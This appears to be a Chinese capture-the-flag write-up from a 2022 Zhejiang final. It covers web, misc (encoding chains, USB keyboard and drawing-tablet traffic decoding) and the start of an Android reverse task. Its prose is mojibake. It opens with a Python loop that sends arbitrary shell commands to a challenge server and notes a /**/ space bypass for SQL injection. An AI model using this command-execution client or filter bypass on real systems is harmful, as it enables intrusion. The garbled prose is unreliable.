<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd=raw_input(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&#x27;%20&#x27;</span>);<br>    t=<span class="hljs-built_in">int</span>(time.time())<br>    d=requests.get(<span class="hljs-string">&#x27;http://172.29.17.232/index.php?a=%s&amp;cmd=%s&#x27;</span>%(<span class="hljs-built_in">int</span>(t),cmd)).text<br><br>    system=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;system:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br>    c=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;cmd:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br><br>    d=requests.get(<span class="hljs-string">&#x27;http://80.endpoint-d9deec0835844de5831e550ffe384d16.dasc.buuoj.cn:81/?cmd=%s&amp;c=%s&amp;b=%s&#x27;</span>%(cmd,c,system))<br>    <span class="hljs-built_in">print</span>(d.text.split(<span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>)[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>


<p><img src="/img/wp/2022/2022zhejiang-final-1.png"></p>
<h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨<code>/**/</code>ä»£æ›¿</p>
<p><img src="/img/wp/2022/2022zhejiang-final-2.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>ä¸¤å¼ å›¾ç‰‡ä¸­é—´æ‹¿åˆ°<code>Gift from glzjin: FIWOIxqEZyIWJwIHG01ZDxqMZ1EUGycHGHHlERqnDyAUDyERHH9PI0qOZ0EWGIcEGIxlESSAGREAHGWUF05RAD== Have a nice time, Bye!</code></p>
<p>å…ˆå‡¯æ’’ä½ç§»13ä½</p>
<p><code>SVJBVkdRMlVJWjVUT01MQkdZM1RHTlpUTUUyREdaQlNHQlREUU9CV0dBM0RJTVpRTVkyRFFNTERNUTJHS05ENQ==</code></p>
<p>base64</p>
<p><code>IRAVGQ2UIZ5TOMLBGY3TGNZTME2DGZBSGBTDQOBWGA3DIMZQMY2DQMLDMQ2GKND5</code></p>
<p>base32</p>
<p><code>DASCTF&#123;71a67373a43d20f88606430f481cd4e4&#125;</code></p>
<h2 id="m4a"><a href="#m4a" class="headerlink" title="m4a"></a>m4a</h2><p>åœ¨æ–‡ä»¶ç»“å°¾å‘ç°ä¸€ä¸ªè¢«åè½¬çš„å‹ç¼©åŒ…ï¼Œæå–å‡ºæ¥ä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…</p>
<p>æ·»åŠ åç¼€<code>mp4</code>å‘ç°å­˜åœ¨æ‘©æ–¯</p>
<p><code>-... .- ....- ...-- -... -.-. . ..-. -.-. ..--- ----- ....-</code></p>
<p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç <code>BA43BCEFC204</code></p>
<p>è§£å‹å¾—åˆ°<br><code>(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</code></p>
<p>rot47</p>
<p><code>WZHXGU&#123;5v0u98z95u79829y7z484z54066xy08u&#125;</code></p>
<p>atbash</p>
<p><code>dasctf&#123;5e0f98a95f79829b7a484a54066cb08f&#125;</code></p>
<p><img src="/img/wp/2022/2022zhejiang-final-3.png"></p>
<h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p><em>èµ›åå¤ç°</em></p>
<p>é™„ä»¶ç»“å°¾å­˜åœ¨ä¸€ä¸²base64å­—ç¬¦ä¸²</p>
<p><code>V2hlcmUxc0tleT8KCu2gve25g+2gve2yte2gvO28v+2gvO2+pO2gve26qu2gvO28j+2gve2wju2gvu21i+2gve26q+2gve24huKche2gvO29je2gvO2+pO2gve2wmO2gvO28j+KEueKMqO2gve24je2gvO2+iOKcie2gvu20o+2gve27qe2gvO29jO2gve26qu2gvO29tOKEueKYuu2gve26ueKdk+2gvO29tO2gve20rO2gvO28qu2gvO29te2gve2xo+2gve20hOKYg+2gve2xjO2gve24ju2gve2xjO2gve20hO2gve2xjO2gve20qu2gvO29jO2gve2xge2gvO29je2gvO29jO2gvO28j+2gvO2+g+2gve26sO2gvO29te2gve2wje2gvO2+heKche2gvO29je2gvu22k+2gve24ju2gve24iu2gvu20o+2gvO2/ue2gvO29je2gve2yp+2gve20hO2gve20hO2gvu20o+2gve2xge2gvu21i+2gve26q+KYuu2gvO29tO2gve24ge2gve26q+2gve24h+2gve26sOKPqe2gve24je2gvO28v+2gve2yte2gvu22k+2gve24h+2gve27qeKclu2gve21ue2gve2wju2gve2zgu2gve2zgu2gve2yp+2gve23ku2gve23kg==</code></p>
<p>è§£å¯†åç”¨<code>UTF-8</code>ç¼–ç æ˜¾ç¤º</p>
<p><img src="/img/wp/2022/2022zhejiang-final-4.png"></p>
<p>stegsolveåˆ†æå›¾ç‰‡ï¼Œ0é€šé“ä¸­å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…</p>
<p>è§£å‹å¾—åˆ°key.txt</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">data:<br>0000100000000000<br>00000c0000000000<br>00000e0000000000<br>00002a0000000000<br>0000100000000000<br>0000040000000000<br>0000080000000000<br>00002a0000000000<br>0000160000000000<br>00000b0000000000<br>00000c0000000000<br>00001c0000000000<br>00002a0000000000<br>00002c0000000000<br>0200340000000000<br>00002a0000000000<br>0200090000000000<br>00000c0000000000<br>0000110000000000<br>0000070000000000<br>0200170000000000<br>00002a0000000000<br>0200170000000000<br>00000b0000000000<br>0000080000000000<br>0000120000000000<br>00002a0000000000<br>0200150000000000<br>0000080000000000<br>0000040000000000<br>00000f0000000000<br>00000a0000000000<br>00002a0000000000<br>02000e0000000000<br>0000080000000000<br>00001c0000000000<br>00000a0000000000<br>00002a0000000000<br>0000040000000000<br>0000110000000000<br>0000070000000000<br>00000f0000000000<br>00002a0000000000<br>0200100000000000<br>0000040000000000<br>00000e0000000000<br>0000080000000000<br>0000080000000000<br>00002a0000000000<br>02000c0000000000<br>0000170000000000<br>02001e0000000000<br>0000070000000000<br>00002a0000000000<br></code></pre></td></tr></table></figure>

<p>æ˜æ˜¾çš„USBé”®ç›˜æµé‡</p>
<p>ä½¿ç”¨è„šæœ¬æå–å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key.txt&#x27;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>mik&lt;DEL&gt;mae&lt;DEL&gt;shiy&lt;DEL&gt;&lt;SPACE&gt;:&lt;DEL&gt;FindT&lt;DEL&gt;Theo&lt;DEL&gt;Realg&lt;DEL&gt;Keyg&lt;DEL&gt;andl&lt;DEL&gt;Makee&lt;DEL&gt;It!d&lt;DEL&gt;</code></p>
<p>å»æ‰åˆ é™¤çš„å­—ç¬¦åº”è¯¥æ˜¯<code>mimashi FindTheRealKeyandMakeIt!</code>ï¼Œä½†æ˜¯è¿™å¥è¯çš„æ„æ€è®©æˆ‘ä»¬æ‰¾åˆ°çœŸæ­£çš„keyï¼Œæ‰€ä»¥è¿™ä¸ªåº”è¯¥æ˜¯å‡çš„key</p>
<p>ä»”ç»†è§‚å¯Ÿåˆ æ‰çš„å­—ç¬¦ï¼Œå‘ç°æ­£å¥½æ˜¯keyå¼€å¤´ï¼Œæå–å‡ºæ¥å¾—åˆ°<code>key:Toggled</code></p>
<p>emoji-aesè§£å¯†å¾—åˆ°flag</p>
<h2 id="hard-Digital-plate"><a href="#hard-Digital-plate" class="headerlink" title="hard_Digital_plate"></a>hard_Digital_plate</h2><p><em>èµ›åå¤ç°</em></p>
<p><code>foremost</code>å¯ä»¥åˆ†ç¦»å‡ºä¸€å¼ å›¾ç‰‡ï¼Œæ ¹æ®åå­—çŒœæµ‹æ˜¯<code>oursecret</code>éšå†™</p>
<p>æµé‡åˆ†æï¼Œå‘ç°æ˜¯æ•°ä½æ¿æµé‡</p>
<p>tsharkæå–<br><code>tshark -r hard_Digital_plate.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; out.txt</code></p>
<p>pythonæå–åæ ‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure>

<p><code>gnuplot</code>ç”»å›¾</p>
<p><img src="/img/wp/2022/2022zhejiang-final-5.png"></p>
<p>å¾—åˆ°<code>oursecret</code>å¯†ç <code>kfae5y4wi2shwj81y2kda6ax7x</code></p>
<p>è§£ä¸€ä¸‹<code>oursecret</code>ï¼Œæ‹¿åˆ°<code>U2FsdGVkX18jQgWzhln3pPiVK8gaBxIzhY1JWcFlKiRdBkV/jDmEBxJV9PZmwBJ7MU3IdNf4hWryZLYRLuxA4w==</code></p>
<p>å›¾ç‰‡å¤‡æ³¨ä¸­çœ‹åˆ°<code>ç³Ÿç³•ï¼Œå¥½åƒæœ‰å‡ ä¸ªå­—å†™çš„å¤ªè½»äº†ï¼Œçœ‹ä¸æ¸…æ¥š</code></p>
<p>æå–ä½å‹æ„Ÿæ•°æ®ï¼Œä»¥<code>0xf000</code>ä½œä¸ºå‹æ„Ÿä¸´ç•Œå€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) &lt; <span class="hljs-number">0xf000</span>:<br>        result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure>

<p><code>gnuplot</code>ç”»å›¾</p>
<p><img src="/img/wp/2022/2022zhejiang-final-6.png"></p>
<p>å¾—åˆ°<code>key</code>ï¼š<code>w12kax</code></p>
<p>aesè§£å¯†</p>
<p><img src="/img/wp/2022/2022zhejiang-final-7.png"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>å…ˆå®‰è£…apkï¼Œéšæ„è¾“å…¥ä¸€ä¸ªå€¼ï¼Œè¿”å›<code>errorï¼</code></p>
<p>jadxä¸­æœç´¢å…³é”®å­—ï¼Œå¾—åˆ°åˆ¤æ–­ä»£ç </p>
